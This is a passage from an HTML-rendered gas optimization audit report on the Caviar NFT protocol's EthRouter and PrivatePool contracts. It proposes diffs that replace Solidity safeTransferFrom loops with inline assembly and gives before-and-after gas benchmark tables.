class=\"grvsc-source\"><span class=\"mtk7\">+                let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let end := add(tokenIds.offset, mul(0x20, tokenIds.length))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let i := tokenIds.offset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x00, 0x42842e0e)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x20, caller())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, address())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x60, calldataload(i))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let success := call(gas(), calldataload(0x24), 0x00, 0x1c, 0x64, 0x00, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    i := add(i, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(lt(i, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L265-L286\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L265-L286</a></p>\n<p><em>Gas Savings for <code>EthRouter.change</code>, obtained via protocol’s tests: Avg 6587 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>284857</td>\n<td>298879</td>\n<td>217295</td>\n<td>4</td>\n</tr>\n<tr>\n<td>After</td>\n<td>276074</td>\n<td>290096</td>\n<td>210708</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"134\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">265</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">266</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">267</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...            </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">284</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">285</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">286</span><span class=\"mtk1\">:            }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"135\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/EthRouter.sol b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 125001d..250b83b 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -260,10 +260,30 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // loop through and execute the changes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; changes.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             Change memory _change = changes[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256[] memory _inputTokenIds = _change.inputTokenIds;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256[] memory _outputTokenIds = _change.outputTokenIds;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer NFTs from caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            for (uint256 j = 0; j &lt; changes[i].inputTokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                ERC721(_change.nft).safeTransferFrom(msg.sender, address(this), _change.inputTokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                if mload(_inputTokenIds) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let end := add(add(_inputTokenIds, 0x20), mul(0x20, mload(_inputTokenIds)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let j := add(_inputTokenIds, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x00, 0x42842e0e)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x20, caller())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x40, address())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        mstore(0x60, mload(j))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        let success := call(gas(), mload(add(_change, 0x20)), 0x00, 0x1c, 0x64, 0x00, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        if iszero(success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        j := add(j, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        if iszero(lt(j, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // approve pair to transfer NFTs from router</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -281,8 +301,26 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer NFTs to caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            for (uint256 j = 0; j &lt; changes[i].outputTokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                ERC721(_change.nft).safeTransferFrom(address(this), msg.sender, _change.outputTokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                if mload(_outputTokenIds) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let end := add(add(_outputTokenIds, 0x20), mul(0x20, mload(_outputTokenIds)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let j := add(_outputTokenIds, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x00, 0x42842e0e)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x20, address())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x40, caller())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        mstore(0x60, mload(j))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        let success := call(gas(), mload(add(_change, 0x20)), 0x00, 0x1c, 0x64, 0x00, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        if iszero(success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        j := add(j, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        if iszero(lt(j, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L441-L448\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L441-L448</a></p>\n<p><em>Gas Savings for <code>PrivatePool.change</code>, obtained via protocol’s tests: Avg 2388 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>116432</td>\n<td>142008</td>\n<td>82138</td>\n<td>17</td>\n</tr>\n<tr>\n<td>After</td>\n<td>113218</td>\n<td>136466</td>\n<td>79750</td>\n<td>17</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"136\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">441</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">442</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">443</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">444</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">445</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// transfer the output nfts to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">446</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">447</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">448</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"137\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 75991e1..859111e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PrivatePool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -438,13 +438,51 @@ contract PrivatePool is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer the input nfts from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; inputTokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(nft).safeTransferFrom(msg.sender, address(this), inputTokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        address _nft = nft;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if mload(inputTokenIds) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let end := add(add(inputTokenIds, 0x20), mul(0x20, mload(inputTokenIds)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let i := add(inputTokenIds, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x00, 0x42842e0e)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x20, caller())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, address())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x60, mload(i))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let success := call(gas(), _nft, 0x00, 0x1c, 0x64, 0x00, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    i := add(i, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(lt(i, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer the output nfts to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; outputTokenIds.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(nft).safeTransferFrom(address(this), msg.sender, outputTokenIds[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if mload(outputTokenIds) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let memptr := mload(0x40)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let end := add(add(outputTokenIds, 0x20), mul(0x20, mload(outputTokenIds)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                let i := add(outputTokenIds, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x00, 0x42842e0e)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x20, address())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, caller())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                for {} 1 {} {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    mstore(0x60, mload(i))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    let success := call(gas(), _nft, 0x00, 0x1c, 0x64, 0x00, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(success) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                        revert(0, 0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    i := add(i, 0x20)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    if iszero(lt(i, end)) { break }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x40, memptr)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                mstore(0x60, 0x00)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L496-L498\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L496-L498</a></p>\n<p><strong>Note: <code>PrivatePool.deposit</code> is fuzzed, which results in inconsistent gas usage during tests. This is why <code>EthRouter.deposit</code> is benchmarked instead</strong>.</p>\n<p><em>Gas Savings for <code>EthRouter.deposit</code>, obtained via protocol’s tests: Avg 232 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>2371</td>\n<td>114072</td>\n<td>29900</td>\n<td>4</td>\n</tr>\n<tr>\n<td>After</td>\n<td>2371</td>\n<td>113145</td>\n<td>29668</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"138\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">496</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">497</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span 